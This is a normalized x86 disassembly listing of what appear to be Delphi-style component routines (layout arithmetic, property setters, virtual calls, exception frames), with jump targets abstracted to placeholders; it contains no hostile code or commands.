jmp r-xdata
mov eax edi
call sub_468e50
fstp [ esp + 0x14 ]
fwait
mov eax edi
call sub_468e78
fsubr [ esp + 0x14 ]
fmul [ r-xdata ]
fstp [ esp + 0x1c ]
fwait
mov eax edi
call sub_468e78
fld [ esp + 0x1c ]
faddp st1
fstp [ esp ]
fwait
mov eax [ ebx + 0x3c ]
call sub_46a554
test al al
je r-xdata
mov eax [ ebx + 0x3c ]
call sub_46a554
test al al
je r-xdata
add esp 0x28
pop ebp
pop edi
pop esi
pop ebx
retn
push [ esp + 0xc ]
push [ esp + 0xc ]
push [ esp + 0xc ]
push [ esp + 0xc ]
mov ecx 0x20000000
xor edx edx
mov eax [ esp + 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x90 ]
push [ esp + 0x4 ]
push [ esp + 0x4 ]
push [ esp + 0x14 ]
push [ esp + 0x14 ]
mov eax esi
call sub_46a554
mov edx eax
mov eax ebx
call sub_469c34
jmp r-xdata
mov eax edi
call sub_468e50
fstp [ esp + 0x14 ]
fwait
mov eax edi
call sub_468e78
fsubr [ esp + 0x14 ]
fmul [ r-xdata ]
fstp [ esp + 0x1c ]
fwait
mov eax edi
call sub_468e78
fld [ esp + 0x1c ]
faddp st1
fstp [ esp ]
fwait
push [ esp + 0x4 ]
push [ esp + 0x4 ]
push [ esp + 0x14 ]
push [ esp + 0x14 ]
mov ecx 0x20000000
xor edx edx
mov eax [ esp + 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x90 ]
jmp r-xdata
sub_469a10
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x3c ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax esi
call sub_46a554
mov edx eax
mov eax ebx
call sub_469c34
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_469a54
push ebx
push esi
push edi
push ebp
add esp 0xffffffc8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
mov eax [ esi + 0x3c ]
mov [ esp + 0x34 ] eax
xor eax eax
mov [ esp + 0x10 ] eax
mov eax [ esp ]
call sub_46b9bc
mov edi eax
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
fstp [ esp + 0x18 ]
fwait
push [ esi + 0x34 ]
push [ esi + 0x30 ]
call sub_460c9c
mov [ esp + 0x30 ] al
mov ebx [ esp + 0x10 ]
mov eax [ esp + 0x18 ]
mov [ esp + 0x20 ] eax
mov eax [ esp + 0x1c ]
mov [ esp + 0x24 ] eax
push [ esi + 0x34 ]
push [ esi + 0x30 ]
mov al [ esp + 0x38 ]
push eax
lea ecx [ esp + 0x24 ]
mov eax [ esp + 0x40 ]
mov eax [ eax + 0x50 ]
mov dl 0x1
call sub_464d78
fld [ r-xdata ]
fmul [ esi + 0x30 ]
fsubr [ esp + 0x18 ]
fstp [ esp + 0x28 ]
fwait
jmp r-xdata
fld [ esi + 0x30 ]
call sub_402990
mov ebx eax
add ebx [ esp + 0x10 ]
dec ebx
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
fstp [ esp + 0x20 ]
fwait
cmp edi ebx
jle r-xdata
mov eax edi
dec eax
cmp ebx eax
jl r-xdata
mov [ esp + 0x31 ] 0x0
cmp edi ebx
jle r-xdata
mov edx ebx
mov eax [ esp + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
fstp [ esp + 0x28 ]
fwait
jmp r-xdata
lea edx [ ebx + 0x1 ]
mov eax [ esp + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
fcomp [ esp + 0x18 ]
fnstsw ax
sahf
jae r-xdata
cmp [ esi + 0x38 ] 0x0
sete al
or al [ esp + 0x31 ]
je r-xdata
mov al [ esi + 0x39 ]
test al al
jne r-xdata
inc ebx
mov eax edi
dec eax
cmp eax [ esp + 0x10 ]
jge r-xdata
inc ebx
mov [ esp + 0x10 ] ebx
cmp al 0x2
jne r-xdata
mov eax [ esp + 0x20 ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x24 ]
mov [ esp + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ esp + 0x28 ] eax
mov [ esp + 0x2c ] eax
cmp [ esi + 0x38 ] 0x0
jne r-xdata
add esp 0x38
pop ebp
pop edi
pop esi
pop ebx
retn
fld [ esp + 0x20 ]
fadd [ esp + 0x28 ]
fmul [ r-xdata ]
fstp [ esp + 0x8 ]
fwait
mov eax [ esp + 0x28 ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x2c ]
mov [ esp + 0xc ] eax
jmp r-xdata
cmp [ esi + 0x38 ] 0x1
jne r-xdata
cmp [ esi + 0x38 ] 0x0
sete al
or al [ esp + 0x31 ]
je r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
fcomp [ esp + 0x18 ]
fnstsw ax
sahf
jae r-xdata
push [ esp + 0xc ]
push [ esp + 0xc ]
push 0x0
push 0x0
mov eax [ esp + 0x10 ]
call sub_46a554
mov edx eax
mov eax esi
call sub_469c34
push [ esp + 0xc ]
push [ esp + 0xc ]
push ebx
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0xc ]
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x30 ]
jmp r-xdata
mov [ esp + 0x31 ] 0x1
sub_469c34
push ebp
mov ebp esp
push ebx
mov ebx eax
test dl dl
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov ecx 0x20000000
xor edx edx
mov eax [ ebx + 0x3c ]
mov ebx [ eax ]
call [ ebx + 0x90 ]
pop ebx
pop ebp
retn 0x10
lea edx [ ebp + 0x8 ]
lea eax [ ebp + 0x10 ]
call sub_460394
sub_469c6c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
fld [ eax + 0x30 ]
call sub_402990
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x4 ]
dec ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_46b9bc
mov esi eax
dec esi
sub esi ebx
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
add esp 0xfffffff8
fstp [ esp ]
fwait
push ebx
mov ecx ebx
sub ecx [ ebp - 0x4 ]
inc ecx
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax ]
call [ edi + 0x3c ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_46a554
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_469c34
inc ebx
dec esi
jne r-xdata
sub_469cf0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_469db2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_46b9bc
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469db9
lea eax [ ebp - 0x14 ]
call sub_403ee8
retn
inc esi
xor ebx ebx
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
lea ecx [ ebp - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
mov edi [ eax ]
call [ edi + 0x60 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x3c ]
mov ecx 0x20000000
mov edi [ eax ]
call [ edi + 0x90 ]
inc ebx
dec esi
jne r-xdata
lea edx [ ebp - 0x10 ]
lea eax [ ebp - 0x8 ]
call sub_460394
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
fstp [ ebp - 0x8 ]
fwait
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x3c ]
mov edx [ eax + 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edi [ eax ]
call [ edi + 0x40 ]
fstp [ ebp - 0x10 ]
fwait
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xd ] 0x0
jne r-xdata
sub_469dc0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x3c ]
mov eax [ ebp - 0x8 ]
call sub_46a554
mov [ ebp - 0xd ] al
cmp [ ebp - 0xd ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8c ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x84 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_46b9bc
test eax eax
jle r-xdata
push ebp
call sub_469cf0
pop ecx
jmp r-xdata
mov eax [ ebx + 0x48 ]
cmp [ eax + 0x8 ] 0x1
jle r-xdata
mov eax [ ebx + 0xa4 ]
cmp [ eax + 0x42 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x30 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jne r-xdata
push ebp
call sub_469c6c
pop ecx
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
jmp r-xdata
sub_469e74
push esi
mov esi eax
mov eax [ esi + 0x3c ]
cmp edx eax
je r-xdata
pop esi
retn
test eax eax
je r-xdata
mov eax edx
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x140 ]
xor ecx ecx
mov [ eax + 0xa4 ] ecx
sub_469eac
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax + 0x30 ]
mov [ ebx + 0x30 ] edx
mov edx [ eax + 0x34 ]
mov [ ebx + 0x34 ] edx
mov dl [ eax + 0x38 ]
mov [ ebx + 0x38 ] dl
mov al [ eax + 0x39 ]
mov [ ebx + 0x39 ] al
sub_469ee0
push ebp
mov ebp esp
push 0x0
mov edx eax
xor eax eax
push ebp
push sub_469f58
push [ fs : eax ]
mov [ fs : eax ] esp
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jae r-xdata
fld [ edx + 0x30 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_403924
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469f5f
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
mov eax [ ebp + 0x8 ]
mov [ edx + 0x30 ] eax
mov eax [ ebp + 0xc ]
mov [ edx + 0x34 ] eax
mov eax edx
call sub_4697d4
sub_469fb0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_46a156
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_419a50
mov [ ebx + 0x9c ] 0xffffffff
xor eax eax
mov [ ebx + 0xf4 ] eax
mov [ ebx + 0x30 ] 0x1
mov [ ebx + 0x90 ] 0x1
xor eax eax
mov [ ebx + 0x50 ] eax
mov [ ebx + 0xa0 ] 0x0
xor eax eax
mov [ ebx + 0x54 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebx + 0x80 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405af8
mov eax [ ebp - 0x8 ]
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_468ba0
mov esi eax
mov [ ebx + 0x84 ] esi
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x2c ] 0x1
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405af8
mov eax [ ebp - 0xc ]
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_468ba0
mov [ ebx + 0x8c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebx + 0x3c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebx + 0x88 ] eax
mov [ ebx + 0x34 ] 0x20000000
mov [ ebx + 0x70 ] 0x1
mov [ ebx + 0x44 ] 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_469124
mov [ ebx + 0x64 ] eax
lea edx [ ebx + 0x7c ]
mov eax [ rw-data ]
call sub_405af8
lea edx [ ebx + 0x6c ]
mov eax [ rw-data ]
call sub_405af8
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebx + 0x48 ] eax
xor eax eax
mov [ ebx + 0x74 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebx + 0x60 ] eax
mov al [ r-xdata ]
mov [ ebx + 0xa1 ] al
mov [ ebx + 0x4c ] 0xffffffff
mov [ ebx + 0x5c ] 0xffffffff
mov [ ebx + 0xfa ] 0x1
mov [ ebx + 0xf8 ] 0x1
mov [ ebx + 0xfb ] 0x0
lea eax [ ebx + 0xf0 ]
call sub_403ee8
mov al [ r-xdata ]
mov [ ebx + 0xa8 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a15d
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403f0c
retn
add esp 0xfffffff0
call sub_4034bc
sub_46a17d
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax ebx
call sub_419e54
mov eax [ ebx + 0xa4 ]
test eax eax
je r-xdata
pop ebx
pop ebp
retn 0x8
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
sub_46a1b4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x7c ]
sub_46a1dc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0xa4 ]
call sub_403198
mov eax esi
mov [ ebx + 0xa4 ] eax
test eax eax
je r-xdata
mov eax ebx
call sub_46a6d0
pop esi
pop ebx
retn
mov [ eax + 0x3c ] ebx
sub_46a208
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_419d6c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_46a750
test eax eax
je r-xdata
cmp eax edi
jne r-xdata
xor edx edx
mov eax esi
call sub_46aa08
sub_46a240
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_419dc8
push ebx
push sub_46a48c
push ebx
push sub_46a514
mov eax [ ebx + 0x48 ]
cmp [ eax + 0x8 ] 0x1
setg cl
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push r-xdata
push ebx
push sub_46a350
cmp [ ebx + 0xf0 ] 0x0
setne cl
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_46a360
push ebx
push r-xdata
mov al [ r-xdata ]
cmp al [ ebx + 0xa8 ]
setne cl
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
retn
sub_46a360
push ebx
push esi
mov ebx eax
mov eax edx
call sub_417e30
mov esi eax
mov al [ r-xdata ]
mov [ ebx + 0xa8 ] al
mov eax esi
and eax 0x1
dec eax
jne r-xdata
mov eax esi
and eax 0x2
cmp eax 0x2
jne r-xdata
mov al [ r-xdata ]
or al [ ebx + 0xa8 ]
mov [ ebx + 0xa8 ] al
mov eax esi
and eax 0x4
cmp eax 0x4
jne r-xdata
mov al [ r-xdata ]
or al [ ebx + 0xa8 ]
mov [ ebx + 0xa8 ] al
mov eax esi
and eax 0x8
cmp eax 0x8
jne r-xdata
mov al [ r-xdata ]
or al [ ebx + 0xa8 ]
mov [ ebx + 0xa8 ] al
mov eax esi
and eax 0x10
cmp eax 0x10
jne r-xdata
mov al [ r-xdata ]
or al [ ebx + 0xa8 ]
mov [ ebx + 0xa8 ] al
and esi 0x20
cmp esi 0x20
jne r-xdata
mov al [ r-xdata ]
or al [ ebx + 0xa8 ]
mov [ ebx + 0xa8 ] al
pop esi
pop ebx
retn
mov al [ r-xdata ]
or al [ ebx + 0xa8 ]
mov [ ebx + 0xa8 ] al
sub_46a48c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_46a505
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_417ee0
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov edi eax
mov [ esi + 0x74 ] edi
mov esi edi
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
mov eax ebx
call sub_416f7c
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_418b80
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax ebx
call sub_417ee8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a50c
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
sub_46a514
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov eax edi
call sub_41972c
mov ebp [ ebx + 0x48 ]
mov ebx [ ebp + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
call sub_419734
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax ebp
call sub_414098
mov edx [ eax + 0x8 ]
mov eax edi
call sub_4197d4
inc esi
dec ebx
jne r-xdata
sub_46a57c
push ebx
push esi
push edi
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x108 ]
test al al
je r-xdata
mov esi [ edi + 0x5c ]
mov ebx [ edi + 0x4c ]
sub ebx esi
jg r-xdata
mov esi [ edi + 0x4c ]
mov ebx [ edi + 0x5c ]
sub ebx esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
dec ebx
inc ebx
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x58 ]
dec esi
inc ebx
jne r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x58 ]
inc esi
dec ebx
jne r-xdata
jmp r-xdata
sub_46a5c8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4030e0
mov edx eax
mov eax ebx
call sub_403324
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax ebx
call sub_4030e0
mov edx eax
mov eax esi
call sub_403324
test al al
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_46a600
push ebx
push esi
push edi
push ebp
add esp 0xffffffe4
mov [ esp + 0x4 ] cl
mov [ esp ] edx
mov esi eax
xor eax eax
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] eax
mov eax [ esi + 0x68 ]
test eax eax
je r-xdata
fld [ esp + 0x8 ]
add esp 0x1c
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x18 ]
mov eax [ eax + 0x2e8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor ebp ebp
cmp [ ebx + 0x30 ] 0x0
je r-xdata
cmp esi ebx
je r-xdata
inc ebp
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_46a5c8
test al al
je r-xdata
mov edx ebp
mov eax [ esp + 0x18 ]
call sub_46da00
mov ebx eax
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_46b9bc
cmp eax [ esp ]
jle r-xdata
mov edx [ esp ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xf8 ]
fstp [ esp + 0x10 ]
fwait
fld [ esp + 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jbe r-xdata
fld [ esp + 0x8 ]
fadd [ esp + 0x10 ]
fstp [ esp + 0x8 ]
fwait
sub_46a6e8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x40 ]
mov edx esi
call sub_4042f4
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x40 ]
mov edx esi
call sub_403f3c
mov esi [ ebx + 0x68 ]
test esi esi
je r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x108 ]
sub_46a71c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x58 ]
mov edx esi
call sub_4042f4
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x58 ]
mov edx esi
call sub_403f3c
mov esi [ ebx + 0x68 ]
test esi esi
je r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x108 ]
sub_46a750
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x48 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
cmp [ esi + 0x8 ] 0x0
jle r-xdata
xor edx edx
mov eax esi
call sub_414098
pop esi
pop ebx
retn
sub_46a774
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x48 ]
call sub_413eec
mov eax ebx
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_419b20
mov edx esi
mov eax ebx
call sub_46cc54
jmp r-xdata
sub_46a7b0
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x48 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x48 ]
call sub_414098
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov edx esi
mov eax [ ebx + 0x48 ]
call sub_414098
test eax eax
je r-xdata
mov edx esi
mov eax [ ebx + 0x48 ]
call sub_414098
mov edx ebx
call sub_46cc88
sub_46a828
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
mov eax [ ebx ]
cmp [ eax + 0x68 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_46a808
pop ecx
mov eax [ ebx ]
mov eax [ eax + 0x68 ]
test eax eax
je r-xdata
mov eax [ ebx ]
call sub_46a750
test eax eax
je r-xdata
mov eax [ ebx ]
mov edx [ eax ]
call [ edx + 0x98 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
call sub_46a750
mov ecx eax
mov edx [ ebx ]
mov eax [ ebx ]
mov eax [ eax + 0x68 ]
mov si 0xffb2
call sub_403394
mov eax [ ebx ]
mov edx [ eax ]
call [ edx + 0xd8 ]
mov edx eax
mov eax [ ebx ]
mov ecx [ eax ]
call [ ecx + 0xa4 ]
jmp r-xdata
mov eax [ ebx ]
call sub_46ae80
pop esi
pop ebx
pop ebp
retn
sub_46a8a8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46a9fb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x68 ]
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x114 ]
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_403924
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba04
call sub_403924
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x48 ]
call sub_4140f4
inc eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46aa02
lea eax [ ebp - 0x10 ]
call sub_403ee8
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x1c ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_46ab0c
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_46a774
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x1c ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_46a808
pop ecx
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x68 ]
mov ecx [ eax ]
call [ ecx + 0x108 ]
jmp r-xdata
sub_46aa08
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push ebp
call sub_46a8a8
pop ecx
push ebp
call sub_46a828
pop ecx
jmp r-xdata
pop ecx
pop ecx
pop ebp
retn
sub_46aa44
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404398
xor eax eax
push ebp
push sub_46aafa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x8c ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_407d28
mov edx [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
call sub_403f80
mov edi [ ebx + 0x80 ]
mov esi [ edi + 0x8 ]
dec esi
sub esi 0x2
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ab01
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f0c
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
inc esi
mov ebx 0x2
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax edi
call sub_469f9c
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_469f9c
mov eax [ eax + 0x28 ]
lea edx [ ebp - 0x10 ]
call sub_407d28
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4042f4
jne r-xdata
sub_46ab20
mov edx [ eax + 0x68 ]
test edx edx
je r-xdata
xor edx edx
mov [ eax + 0x50 ] edx
xor edx edx
mov [ eax + 0x54 ] edx
mov edx [ edx + 0x2f4 ]
mov [ eax + 0x50 ] edx
mov dl [ eax + 0x90 ]
sub dl 0x1
jb r-xdata
mov edx [ eax + 0x68 ]
mov edx [ edx + 0x2f0 ]
mov [ eax + 0x50 ] edx
jmp r-xdata
sub dl 0x2
je r-xdata
mov edx [ eax + 0x68 ]
